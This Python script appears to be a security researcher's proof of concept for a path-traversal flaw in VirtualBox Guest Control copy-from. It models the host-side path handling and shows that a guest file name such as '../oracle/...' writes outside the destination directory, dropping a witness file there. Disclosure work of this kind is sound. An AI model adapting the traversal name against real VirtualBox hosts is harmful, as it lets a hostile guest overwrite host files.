#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: vbox-guestctrl-copyfrom-dotdot (High: 8.2)
#  Vendor: Oracle VM VirtualBox OSS
#  Versions: VirtualBox OSS 7.2.20 (f2792cf44)
#  Impact: Guest Control copy-from concatenates DIR_NOTIFY names with .. onto the host dest
#  Requires: Source harness; docker compose; loopback; GAs plus host copy-from on a real VM
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "vbox-guestctrl-copyfrom-dotdot"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Source harness for VirtualBox Guest Control copy-from DOTDOT leftover.

Reimplements pin v7.2.20 peel f2792cf44f663989818507e36d3db5f978523c5e:
AddDirFromGuest skip of exact "." / "..", GuestPath::Translate (slash style
plus double-slash collapse, no DOTDOT reject), CopyFrom::Run dest+sep+entry
join then RTFileOpen write/create, and BuildDestinationPath dest-root
RTPATH_PROP_DOTDOT_REFS reject. Does not boot VirtualBox or Guest Additions.
"""

from dataclasses import dataclass
from enum import Enum
from pathlib import Path

LABEL = "vbox-guestctrl-copyfrom-dotdot"
WITNESS = "VBOX-GUESTCTRL-COPYFROM-DOTDOT-WITNESS"
PIN = "v7.2.20"
PIN_COMMIT = "f2792cf44f663989818507e36d3db5f978523c5e"

DEST_ROOT = Path("/work/vbox-copy")
ORACLE_DIR = Path("/work/oracle")
DST_ROOT_CONTROL = Path("/work/dst-root")

GUEST_ESCAPE_NAME = f"../oracle/{WITNESS}"
BENIGN_NAME = "benign.txt"
CONTROL_DEST_WITH_DOTDOT = "/work/dst-root/../outside"

VINF_SUCCESS = 0
VERR_INVALID_PARAMETER = -2
NATIVE_SEP = "/"


class PathStyle(Enum):
    UNIX = "unix"
    DOS = "dos"


class FsObjType(Enum):
    DIRECTORY = "directory"
    FILE = "file"


@dataclass(frozen=True)
class GuestListing:
    name: str
    kind: FsObjType


@dataclass(frozen=True)
class TranslateResult:
    path: str
    status: int


@dataclass(frozen=True)
class DestBuildResult:
    path: str
    status: int
    has_dotdot_refs: bool


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def skip_dir_listing_name(name: str) -> bool:
    """FsList::AddDirFromGuest: skip only exact directory names '.' and '..'."""
    return name in (".", "..")


def add_dir_from_guest(listings: list[GuestListing], path_sub: str = "") -> list[str]:
    """Store guest names the way AddDirFromGuest does (no per-entry DOTDOT check)."""
    prefix = path_sub
    if prefix and not prefix.endswith(NATIVE_SEP):
        prefix += NATIVE_SEP
    accepted: list[str] = []
    for listing in listings:
        entry = prefix + listing.name
        if listing.kind is FsObjType.DIRECTORY:
            if skip_dir_listing_name(listing.name):
                continue
            accepted.append(entry)
            continue
        if listing.kind is FsObjType.FILE:
            accepted.append(entry)
    return accepted


def _change_slashes(path: str, dst_style: PathStyle) -> str:
    if dst_style is PathStyle.UNIX:
        return path.replace("\\", "/")
    return path.replace("/", "\\")


def _collapse_double_slashes(path: str, dst_style: PathStyle) -> str:
    """GuestPath::Translate double-slash walk. Does not strip trailing slashes."""
    chars = list(path)
    off = 0
    cch = len(chars)
    needle = "\\" if dst_style is PathStyle.DOS else "/"
    while off < cch:
        if off + 1 > cch:
            break
        if off + 1 < len(chars) and chars[off] == needle and chars[off + 1] == needle:
            del chars[off + 1]
            off += 1
        off += 1
        cch = len(chars)
    return "".join(chars)


def translate(
    path: str,
    src_style: PathStyle,
    dst_style: PathStyle,
    force: bool = False,
) -> TranslateResult:
    """GuestPath::Translate: slash style change + collapse '//'. Does not reject '..'."""
    if path == "":
        return TranslateResult(path="", status=VINF_SUCCESS)

    converted = ""
    if (src_style is PathStyle.DOS and dst_style is PathStyle.UNIX) or (
        force and dst_style is PathStyle.UNIX
    ):
        converted = _change_slashes(path, PathStyle.UNIX)
    elif (src_style is PathStyle.UNIX and dst_style is PathStyle.DOS) or (
        force and dst_style is PathStyle.DOS
    ):
        converted = _change_slashes(path, PathStyle.DOS)

    if converted == "" and src_style is dst_style:
        converted = path
    if converted == "":
        converted = path

    converted = _collapse_double_slashes(converted, dst_style)
    return TranslateResult(path=converted, status=VINF_SUCCESS)


def has_dotdot_refs(path: str, style: PathStyle = PathStyle.UNIX) -> bool:
    """RTPATH_PROP_DOTDOT_REFS: a component whose length is 2 and both chars are '.'."""
    sep = "\\" if style is PathStyle.DOS else "/"
    for component in path.split(sep):
        if len(component) == 2 and component == "..":
            return True
    return False


def rtpath_filename(path: str, style: PathStyle) -> str | None:
    """RTPathFilenameEx: last component, or None when the path ends with a separator."""
    sep = "\\" if style is PathStyle.DOS else "/"
    if path.endswith(sep) or path == "":
        return None
    name = path.rsplit(sep, maxsplit=1)[-1]
    return name if name else None


def build_destination_path(
    src_path: str,
    dst_path: str,
    src_style: PathStyle = PathStyle.UNIX,
    dst_style: PathStyle = PathStyle.UNIX,
) -> DestBuildResult:
    """GuestPath::BuildDestinationPath including dest-root DOTDOT reject (#4)."""
    src_name = rtpath_filename(src_path, src_style)
    dst_name = rtpath_filename(dst_path, dst_style)
    built = dst_path
    sep = "\\" if dst_style is PathStyle.DOS else "/"
    if (not src_name and not dst_name) or (src_name and dst_name):
        pass
    elif src_name and not dst_name:
        if not built.endswith(sep):
            built += sep
        built += src_name

    translated = translate(built, src_style, dst_style)
    if translated.status != VINF_SUCCESS:
        return DestBuildResult(
            path=translated.path,
            status=translated.status,
            has_dotdot_refs=has_dotdot_refs(translated.path, dst_style),
        )
    dotted = has_dotdot_refs(translated.path, dst_style)
    status = VERR_INVALID_PARAMETER if dotted else VINF_SUCCESS
    return DestBuildResult(path=translated.path, status=status, has_dotdot_refs=dotted)


def copy_from_join(dst_root_abs: str, entry_path: str) -> str:
    """CopyFrom::Run: strDstAbs = dest + native_sep + pEntry->strPath."""
    return dst_root_abs + NATIVE_SEP + entry_path


def copy_from_host_path(dst_root_abs: str, entry_path: str) -> TranslateResult:
    """CopyFrom::Run join then Translate. No BuildDestinationPath on the entry."""
    joined = copy_from_join(dst_root_abs, entry_path)
    return translate(joined, PathStyle.UNIX, PathStyle.UNIX)


def rtfile_open_write_create(dst: str, payload: str) -> Path:
    """RTFileOpen(WRITE | OPEN_CREATE) then write guest-chosen bytes."""
    target = Path(dst)
    with target.open("w", encoding="utf-8") as handle:
        handle.write(payload)
        if not payload.endswith("\n"):
            handle.write("\n")
    return target


def dest_entries(root: Path) -> list[str]:
    if not root.exists():
        return []
    names = [path.name for path in root.iterdir()]
    names.sort()
    return names


def is_under(child: Path, root: Path) -> bool:
    try:
        child.resolve().relative_to(root.resolve())
    except ValueError:
        return False
    return True


def prepare_work() -> None:
    DEST_ROOT.mkdir(parents=True, exist_ok=True)
    ORACLE_DIR.mkdir(parents=True, exist_ok=True)
    DST_ROOT_CONTROL.mkdir(parents=True, exist_ok=True)
    for leftover in DEST_ROOT.iterdir():
        if leftover.is_file() or leftover.is_symlink():
            leftover.unlink()
    oracle_file = ORACLE_DIR / WITNESS
    if oracle_file.exists() or oracle_file.is_symlink():
        oracle_file.unlink()


def prove_skip() -> tuple[bool, list[str]]:
    listings = [
        GuestListing(name=".", kind=FsObjType.DIRECTORY),
        GuestListing(name="..", kind=FsObjType.DIRECTORY),
        GuestListing(name=BENIGN_NAME, kind=FsObjType.FILE),
        GuestListing(name=GUEST_ESCAPE_NAME, kind=FsObjType.FILE),
    ]
    accepted = add_dir_from_guest(listings)
    skipped_exact = "." not in accepted and ".." not in accepted
    if not skipped_exact:
        return False, accepted

    before = set(dest_entries(DEST_ROOT))
    for name in (".", ".."):
        if skip_dir_listing_name(name):
            continue
        result = copy_from_host_path(str(DEST_ROOT), name)
        rtfile_open_write_create(result.path, "should-not-write")
    after = set(dest_entries(DEST_ROOT))
    return after == before, accepted


def prove_translate_keeps_dotdot() -> tuple[bool, TranslateResult]:
    sample = copy_from_join(str(DEST_ROOT), GUEST_ESCAPE_NAME)
    result = translate(sample, PathStyle.UNIX, PathStyle.UNIX)
    keeps = (
        result.status == VINF_SUCCESS
        and ".." in result.path
        and result.path == sample
    )
    return keeps, result


def prove_join_escape() -> tuple[bool, Path, TranslateResult]:
    result = copy_from_host_path(str(DEST_ROOT), GUEST_ESCAPE_NAME)
    written = rtfile_open_write_create(result.path, WITNESS)
    oracle_file = ORACLE_DIR / WITNESS
    exists_outside = oracle_file.is_file() and not is_under(oracle_file, DEST_ROOT)
    body = oracle_file.read_text(encoding="utf-8") if oracle_file.is_file() else ""
    ok = (
        result.status == VINF_SUCCESS
        and exists_outside
        and WITNESS in body.splitlines()
        and not is_under(written, DEST_ROOT)
        and WITNESS not in dest_entries(DEST_ROOT)
    )
    return ok, oracle_file, result


def prove_dest_root_check(per_entry_translated: str) -> tuple[bool, DestBuildResult, DestBuildResult]:
    root_check = build_destination_path("/guest/src/", CONTROL_DEST_WITH_DOTDOT)
    unused_on_entry = build_destination_path("/guest/src/", per_entry_translated)
    ok = (
        root_check.status == VERR_INVALID_PARAMETER
        and root_check.has_dotdot_refs
        and unused_on_entry.status == VERR_INVALID_PARAMETER
        and unused_on_entry.has_dotdot_refs
        and has_dotdot_refs(per_entry_translated)
    )
    return ok, root_check, unused_on_entry


def main() -> int:
    log(f"label={LABEL} pin={PIN} peel={PIN_COMMIT}")
    log("how=source-harness guestctrl-copyfrom Translate+join (no VirtualBox boot)")
    log(f"ioc dest-root={DEST_ROOT}")
    log(f"ioc oracle-dir={ORACLE_DIR}")
    log(f"ioc dest-root-control={DST_ROOT_CONTROL}")
    log(f"ioc guest-escape-name={GUEST_ESCAPE_NAME}")

    prepare_work()

    skip_ok, accepted = prove_skip()
    log(f"ioc skip-accepted={accepted!r}")
    log(f"ioc skip-dot={('yes' if skip_ok else 'no')}")
    if not skip_ok:
        return fail("skip-dot")
    if BENIGN_NAME not in accepted:
        return fail("skip-dropped-benign")
    if GUEST_ESCAPE_NAME not in accepted:
        return fail("skip-dropped-escape-name")

    benign = copy_from_host_path(str(DEST_ROOT), BENIGN_NAME)
    if benign.status != VINF_SUCCESS:
        return fail("benign-translate")
    rtfile_open_write_create(benign.path, "inside-dest")
    if not (DEST_ROOT / BENIGN_NAME).is_file():
        return fail("benign-not-in-dest")
    log(f"ioc benign-in-dest=yes path={benign.path}")

    translate_ok, translated = prove_translate_keeps_dotdot()
    log(f"ioc translate-status={translated.status}")
    log(f"ioc translate-path={translated.path}")
    log(f"ioc translate-keeps-dotdot={('yes' if translate_ok else 'no')}")
    if not translate_ok:
        return fail("translate-keeps-dotdot")

    escape_ok, oracle_file, escape_translated = prove_join_escape()
    resolved = oracle_file.resolve() if oracle_file.exists() else Path()
    log(f"ioc join={copy_from_join(str(DEST_ROOT), GUEST_ESCAPE_NAME)}")
    log(f"ioc copyfrom-translated={escape_translated.path}")
    log(f"ioc escaped-write-path={resolved}")
    log(f"ioc escaped-write={('yes' if escape_ok else 'no')}")
    if not escape_ok:
        return fail("escaped-write")
    if is_under(oracle_file, DEST_ROOT):
        return fail("witness-under-dest")

    dest_ok, root_check, entry_check = prove_dest_root_check(escape_translated.path)
    log(
        "ioc dest-root-dotdot "
        f"path={root_check.path} status={root_check.status} "
        f"has-dotdot={int(root_check.has_dotdot_refs)}"
    )
    log(
        "ioc per-entry-dotdot-if-checked "
        f"path={entry_check.path} status={entry_check.status} "
        f"has-dotdot={int(entry_check.has_dotdot_refs)}"
    )
    log("ioc dest-root-check-unused-per-entry=yes")
    if not dest_ok:
        return fail("dest-root-check")
    if root_check.status == VINF_SUCCESS:
        return fail("dest-root-check-did-not-reject")

    log(
        f"SUCCESS {LABEL} skip-dot=yes translate-keeps-dotdot=yes "
        f"escaped-write=yes dest-root-check-unused-per-entry=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

